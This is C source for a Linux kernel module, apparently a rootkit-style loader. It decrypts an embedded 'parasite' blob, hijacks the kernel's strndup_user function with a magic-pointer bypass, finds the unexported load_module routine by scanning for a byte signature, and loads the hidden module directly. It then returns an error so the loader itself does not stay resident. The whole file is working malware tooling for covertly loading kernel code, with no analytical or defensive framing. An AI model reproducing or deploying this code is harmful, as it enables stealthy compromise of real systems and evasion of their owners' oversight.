#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/jiffies.h>
#include <linux/wait.h>

#include "libs/encrypt.h"
#include "libs/symbol_lookup.h"
#include "libs/load_helpers.h"
#include "libs/kernel_patcher.h"

static unsigned char load_module_signature[] = {
0xf,	0x1f,	0x44,	0x0,	0x0,	0x55,	0x48,	0x89,
0xe5,	0x41,	0x57,	0x41,	0x56,	0x41,	0x55,	0x49,
0x89,	0xfd,	0x41,	0x54,	0x41,	0x89,	0xd4,	0x53,
0x48,	0x83,	0xec,	0x50,	0x48,	0x89,	0x75,	0x90,
0x48,	0x8b,	0x7f,	0x10,
};

static char parasite_blob[] = {
# include "parasite_blob.inc"
};

char *my_strndup_user(const char *s, long n)
{

    if (s == (void*) 0x4242) {
        char* valid_uargs = kmalloc(1, GFP_KERNEL);
        return valid_uargs;
    }

	char *p;
	long length;

	length = strnlen_user(s, n);

	if (!length)
		return ERR_PTR(-EFAULT);

	if (length > n)
		return ERR_PTR(-EINVAL);

	p = memdup_user(s, length);

	if (IS_ERR(p))
		return p;

	p[length - 1] = '\0';

	return p;
}

int init_module(void)
{
    int err;
    void* orig_code;
    size_t orig_len;
    asmlinkage int (*load_module)(struct load_info *, const char*, int) = NULL;    
    
    printk("%s is saying:\n"
	       "Hello, I'm the loader.\n"
	       "I will load the parasite for you.\n", KBUILD_MODNAME);
    
	
    do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);

    printk(KERN_INFO "parasite decrypted\n");

    // init struct
    struct load_info *info = kmalloc(sizeof(struct load_info), GFP_KERNEL);
    info->len = sizeof(parasite_blob);
    info->hdr = __vmalloc(sizeof(parasite_blob), GFP_KERNEL | __GFP_NOWARN);
    if (!info->hdr) {
        printk(KERN_ERR "vmalloc failed\n");
    	return -ENOMEM;
    }

    //copy module
    if (copy_chunked_from_kernel(info->hdr, parasite_blob, sizeof(parasite_blob)) != 0) {
        vfree(info->hdr);
        printk(KERN_ERR "copy failed\n");
        return -EFAULT;
    } 

    printk(KERN_INFO "module ready\n");
    
    init_allocator();
    
    hijack_function(strndup_user, my_strndup_user, &orig_code, &orig_len);

    printk(KERN_INFO "probe installed\n");

    load_module = (void*) lookup_signature((void*) load_module_signature, sizeof(load_module_signature), (unsigned long) module_put, 1);

    if (load_module) {
        
        if ((err = load_module(info, (char*) 0x4242, 0)) != 0) {
            printk(KERN_ERR "Error loading module: %d\n", err);
        }

    }

    restore_original_function(strndup_user, orig_code, orig_len);
    
	return -EINVAL;
}

void cleanup_module(void) 

{ 
    
    pr_info("Goodbye world 1.\n"); 

} 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pasquale Caporaso");
